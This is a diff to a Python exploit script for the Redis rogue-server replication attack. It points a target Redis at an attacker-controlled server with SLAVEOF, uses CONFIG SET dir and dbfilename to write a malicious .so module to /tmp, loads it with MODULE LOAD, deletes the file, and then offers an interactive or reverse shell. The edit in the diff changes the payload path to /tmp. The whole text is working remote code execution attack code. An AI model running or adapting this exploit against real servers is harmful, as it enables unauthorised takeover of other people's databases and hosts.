@@ -203,9 +203,9 @@ def runserver(rhost, rport, lhost, lport, passwd):
     - Authenticate (if password given)
     - Reset any existing slave connection with SLAVEOF NO ONE
     - Set slaveof to rogue server
-    - Configure Redis to save .so payload file
+    - Configure Redis to save .so payload file in /tmp
     - Serve the payload via rogue server
-    - Load the module into Redis
+    - Load the module into Redis from /tmp/module.so
     - Cleanup and provide interactive shell options
     """
     remote = Remote(rhost, rport)
@@ -221,6 +221,10 @@ def runserver(rhost, rport, lhost, lport, passwd):
     slaveof_resp = remote.do(f"SLAVEOF {lhost} {lport}")
     info(f"SLAVEOF response: {slaveof_resp.strip()}")
 
+    info("Setting Redis working directory to /tmp ...")
+    dir_set_resp = remote.do("CONFIG SET dir /tmp")
+    info(f"CONFIG SET dir response: {dir_set_resp.strip()}")
+
     info("Setting dbfilename for payload...")
     dbfile_resp = remote.do(f"CONFIG SET dbfilename {SERVER_EXP_MOD_FILE}")
     info(f"CONFIG SET dbfilename response: {dbfile_resp.strip()}")
@@ -230,13 +234,15 @@ def runserver(rhost, rport, lhost, lport, passwd):
     rogue.exp()
     sleep(2)
 
-    info("Loading module...")
-    remote.do(f"MODULE LOAD ./{SERVER_EXP_MOD_FILE}")
+    load_path = "/tmp/" + SERVER_EXP_MOD_FILE
+    info(f"Loading module from {load_path} ...")
+    load_resp = remote.do(f"MODULE LOAD {load_path}")
+    info(f"MODULE LOAD response: {load_resp.strip()}")
 
     info("Temporary cleaning up...")
     remote.do("SLAVEOF NO ONE")
     remote.do("CONFIG SET dbfilename dump.rdb")
-    remote.shell_cmd(f"rm ./{SERVER_EXP_MOD_FILE}")
+    remote.shell_cmd(f"rm {load_path}")
     rogue.close()
 
     choice = input("What do you want, [i]nteractive shell or [r]everse shell: ")
